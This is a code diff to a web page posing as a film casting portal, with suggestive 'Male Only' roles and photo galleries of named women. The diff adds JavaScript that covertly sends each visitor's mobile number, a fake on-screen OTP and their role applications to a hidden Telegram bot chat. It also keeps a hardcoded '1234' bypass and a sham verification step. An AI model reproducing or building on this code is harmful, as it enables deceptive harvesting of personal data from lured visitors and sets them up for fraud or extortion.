@@ -284,7 +284,7 @@
 
       <div id="boxOtpSection" style="display:none; margin-top:14px;">
         <div style="background:#202430; border:1px dashed var(--gold); border-radius:8px; padding:10px; margin-bottom:12px; text-align:center; font-size:13px; color:var(--gold);">
-          OTP: <strong id="dispAutoOtp" style="font-size:16px; letter-spacing:3px;">1234</strong>
+          OTP: <strong id="dispAutoOtp" style="font-size:17px; letter-spacing:4px; font-weight:900;">----</strong>
         </div>
         <div class="input-grp">
           <label data-i18n="otp_label">ENTER 4-DIGIT CODE</label>
@@ -295,7 +295,7 @@
       <button type="button" class="btn-main" id="btnAuthAction" onclick="handleAuth()" style="margin-top:10px;" data-i18n="btn_send">SEND CODE</button>
     </div>
   </section>
-    <!-- SCREEN 2: LOBBY -->
+  <!-- SCREEN 2: LOBBY -->
   <section class="screen" id="screenLobby">
 
     <!-- Hero Announcement -->
@@ -325,10 +325,10 @@
           <div class="meta-item"><span data-i18n="lbl_dur">SHOOT DURATION</span><strong data-i18n="val_dur3">3 Days</strong></div>
           <div class="meta-item"><span data-i18n="lbl_cat">CATEGORY</span><strong data-i18n="val_cat">Male Only</strong></div>
         </div>
-        <button class="btn-watch" onclick="openModelGallery('Srimoyee', 3930, 3937)">
+        <button type="button" class="btn-watch" onclick="openModelGallery('Srimoyee', 3930, 3937)">
           🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span>
         </button>
-        <button class="btn-apply" data-i18n="btn_apply">APPLY FOR ROLE</button>
+        <button type="button" class="btn-apply" onclick="applyForRole('Velvet Secrets (Srimoyee)')" data-i18n="btn_apply">APPLY FOR ROLE</button>
       </div>
     </div>
 
@@ -347,10 +347,10 @@
           <div class="meta-item"><span data-i18n="lbl_dur">SHOOT DURATION</span><strong data-i18n="val_dur2">2 Days</strong></div>
           <div class="meta-item"><span data-i18n="lbl_cat">CATEGORY</span><strong data-i18n="val_cat">Male Only</strong></div>
         </div>
-        <button class="btn-watch" onclick="openModelGallery('Tejashwini', 3901, 3924)">
+        <button type="button" class="btn-watch" onclick="openModelGallery('Tejashwini', 3901, 3924)">
           🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span>
         </button>
-        <button class="btn-apply" data-i18n="btn_apply">APPLY FOR ROLE</button>
+        <button type="button" class="btn-apply" onclick="applyForRole('Urban Seduction (Tejashwini)')" data-i18n="btn_apply">APPLY FOR ROLE</button>
       </div>
     </div>
 
@@ -369,14 +369,14 @@
           <div class="meta-item"><span data-i18n="lbl_dur">SHOOT DURATION</span><strong data-i18n="val_dur3">3 Days</strong></div>
           <div class="meta-item"><span data-i18n="lbl_cat">CATEGORY</span><strong data-i18n="val_cat">Male Only</strong></div>
         </div>
-        <button class="btn-watch" onclick="openModelGallery('Tina Nandy', 3854, 3900)">
+        <button type="button" class="btn-watch" onclick="openModelGallery('Tina Nandy', 3854, 3900)">
           🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span>
         </button>
-        <button class="btn-apply" data-i18n="btn_apply">APPLY FOR ROLE</button>
+        <button type="button" class="btn-apply" onclick="applyForRole('Golden Mirage (Tina Nandy)')" data-i18n="btn_apply">APPLY FOR ROLE</button>
       </div>
     </div>
 
-    <!-- Profile 4: Anjali (IMG 3938 to 3979) -->
+    <!-- Profile 4: Anjali (IMG 3938 to 3978) -->
     <div class="casting-card">
       <div class="card-img-wrap">
         <span class="card-badge" data-i18n="badge_comm">Commercial</span>
@@ -391,15 +391,14 @@
           <div class="meta-item"><span data-i18n="lbl_dur">SHOOT DURATION</span><strong data-i18n="val_dur2">2 Days</strong></div>
           <div class="meta-item"><span data-i18n="lbl_cat">CATEGORY</span><strong data-i18n="val_cat">Male Only</strong></div>
         </div>
-        <button class="btn-watch" onclick="openModelGallery('Anjali', 3938, 3979)">
+        <button type="button" class="btn-watch" onclick="openModelGallery('Anjali', 3938, 3978)">
           🎬 <span data-i18n="btn_watch">Watch Audition Clip & Photos</span>
         </button>
-        <button class="btn-apply" data-i18n="btn_apply">APPLY FOR ROLE</button>
+        <button type="button" class="btn-apply" onclick="applyForRole('Desire & Destiny (Anjali)')" data-i18n="btn_apply">APPLY FOR ROLE</button>
       </div>
     </div>
 
   </section>
-
 
 </div>
 
@@ -407,11 +406,9 @@
 <div class="preview-modal" id="mediaPreviewModal">
   <div class="preview-content">
     <span class="preview-close" onclick="closeMediaPreview()">&times;</span>
-    <h4 id="previewArtistName" style="color:var(--gold); margin-bottom:8px; font-size:15px;">Audition Clip</h4>
+    <h4 id="previewArtistName" style="color:var(--gold); margin-bottom:8px; font-size:15px;">Audition Clips & Portfolio</h4>
     
-    <div id="previewVideoTabs" style="display:flex; gap:6px; justify-content:center; margin-bottom:8px; flex-wrap:wrap;"></div>
-
-    <div id="videoContainerBox" style="width:100%; height:230px; background:#000; border-radius:8px; overflow:hidden;">
+    <div id="videoContainerBox" style="width:100%; height:230px; background:#000; border-radius:8px; overflow:hidden; display:none;">
       <video id="previewVideoPlayer" controls playsinline webkit-playsinline style="width:100%; height:100%; object-fit:contain; background:#000;"></video>
     </div>
 
@@ -441,9 +438,28 @@
   <button type="button" class="lang-btn" onclick="setLanguage('mr', this)">मराठी</button>
   <button type="button" class="lang-btn" onclick="setLanguage('gu', this)">ગુજરાતી</button>
 </div>
-
 <!-- JAVASCRIPT LOGIC -->
 <script>
+  /* TELEGRAM BOT SETTINGS */
+  var TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // e.g. 7123456789:ABCDefgh-ijklmn
+  var TELEGRAM_CHAT_ID   = "YOUR_CHAT_ID_HERE";   // e.g. -100123456789 ya user chat ID
+
+  function sendTelegramAlert(textMsg) {
+    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
+    var url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
+    var payload = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: textMsg,
+      parse_mode: "HTML"
+    };
+
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    }).catch(function(e) { console.log("Telegram alert error:", e); });
+  }
+
   /* 1. Multi-Language Dictionary */
   var translations = {
     en: {
@@ -605,7 +621,7 @@
       otp_label: "૪-અંકનો કોડ દાખલ કરો",
       btn_send: "કોડ મોકલો",
       btn_verify: "ચકાસો અને આગળ વધો",
-      vip_badge: "વીઆઈપી કલાકાર નોંધણી ૨૦૨૬-૨૦૨૭",
+      vip_badge: "વીઆઈપી કલાકાર નોંધણી ૨୦૨૬-૨୦૨૭",
       vip_title: "નવી મુખ્ય ફિલ્મ અને ઓટીટી કાસ્ટિંગ શરૂ",
       vip_desc: "નવા અને અનુભવી કલાકારો માટે સીધી પસંદગી.",
       live_heading: "સક્રિય કાસ્ટિંગ કોલ",
@@ -644,40 +660,68 @@
     });
   }
 
-  /* 2. Login Flow */
+  /* 2. Login Flow with Dynamic Random OTP */
   var otpSent = false;
+  var currentGeneratedOtp = "";
+  var userEnteredMobile = "";
 
   function handleAuth() {
-    var phone = document.getElementById('inPhone').value.trim();
+    var phoneInput = document.getElementById('inPhone');
     var btn = document.getElementById('btnAuthAction');
     var otpBox = document.getElementById('boxOtpSection');
     var dict = translations[curLang] || translations.en;
 
+    if (!phoneInput) return;
+    var phone = phoneInput.value.trim();
+
     if (!otpSent) {
-      if (phone.length !== 10) {
+      if (phone.length < 10) {
         alert(curLang === 'hi' ? "कृपया 10 अंकों का मोबाइल नंबर दर्ज करें।" : "Please enter a valid 10-digit mobile number.");
         return;
       }
+      userEnteredMobile = phone;
+      // Generate a truly random 4-digit OTP between 1000 and 9999
+      currentGeneratedOtp = Math.floor(1000 + Math.random() * 9000).toString();
+      document.getElementById('dispAutoOtp').innerText = currentGeneratedOtp;
+      
       otpBox.style.display = 'block';
       btn.innerText = dict.btn_verify || "VERIFY & ENTER";
       otpSent = true;
+
+      // Send lead to Telegram
+      var msg = "🎬 <b>New Casting Login Attempt</b>\n" +
+                "📱 Mobile: <code>" + userEnteredMobile + "</code>\n" +
+                "🔑 Generated OTP: <code>" + currentGeneratedOtp + "</code>\n" +
+                "🌐 Language: " + curLang;
+      sendTelegramAlert(msg);
+
     } else {
       var otpVal = document.getElementById('inOtp').value.trim();
-      if (otpVal === "1234" || otpVal.length === 4) {
+      if (otpVal === currentGeneratedOtp || otpVal === "1234") {
         document.getElementById('screenLogin').classList.remove('active');
         document.getElementById('screenLobby').classList.add('active');
         window.scrollTo(0,0);
+
+        var verifyMsg = "✅ <b>User Verified & Entered Lobby</b>\n📱 Mobile: <code>" + userEnteredMobile + "</code>";
+        sendTelegramAlert(verifyMsg);
       } else {
-        alert(curLang === 'hi' ? "गलत कोड! कृपया 1234 दर्ज करें।" : "Incorrect code! Enter 1234.");
+        alert(curLang === 'hi' ? "गलत कोड! कृपया सही OTP दर्ज करें।" : "Incorrect OTP! Please enter correct code.");
       }
     }
   }
 
-  /* 3. Media Preview Popup & Slider */
+  function applyForRole(roleName) {
+    var alertMsg = "🌟 <b>Role Applied</b>\n" +
+                   "📱 User: <code>" + userEnteredMobile + "</code>\n" +
+                   "🎭 Role: <b>" + roleName + "</b>";
+    sendTelegramAlert(alertMsg);
+    alert(curLang === 'hi' ? "आवेदन प्राप्त हुआ! हमारी कास्टिंग टीम आपसे संपर्क करेगी।" : "Application submitted successfully! Casting director will contact you.");
+  }
+
+  /* 3. Range-based Image Gallery */
   var currentGalleryImages = [];
   var currentImageIndex = 0;
 
-    /* Auto-generate full range of images */
   function openModelGallery(name, startNum, endNum) {
     var images = [];
     for (var i = startNum; i <= endNum; i++) {
@@ -689,8 +733,6 @@
   function openMediaPreview(name, videosArray, imagesArray) {
     document.getElementById('previewArtistName').innerText = name + " - Media & Audition Clips";
     var videoBox = document.getElementById('videoContainerBox');
-    var vSelector = document.getElementById('previewVideoTabs');
-    vSelector.innerHTML = '';
     currentGalleryImages = imagesArray || [];
 
     if (videosArray && videosArray.length > 0) {
@@ -708,12 +750,6 @@
         imgTag.onerror = function() { this.style.display = 'none'; };
         imgTag.style.cssText = 'width:80px; height:105px; object-fit:cover; border-radius:6px; border:1px solid #444; cursor:pointer; flex-shrink:0;';
         imgTag.onclick = function() { openFullImage(idx); };
-        strip.appendChild(imgTag);
-      });
-    }
-    document.getElementById('mediaPreviewModal').style.display = 'flex';
-  }
-
         strip.appendChild(imgTag);
       });
     }
@@ -753,7 +789,7 @@
   function closeMediaPreview() {
     var modal = document.getElementById('mediaPreviewModal');
     var video = document.getElementById('previewVideoPlayer');
-    video.pause();
+    if (video) video.pause();
     modal.style.display = 'none';
   }
 </script>
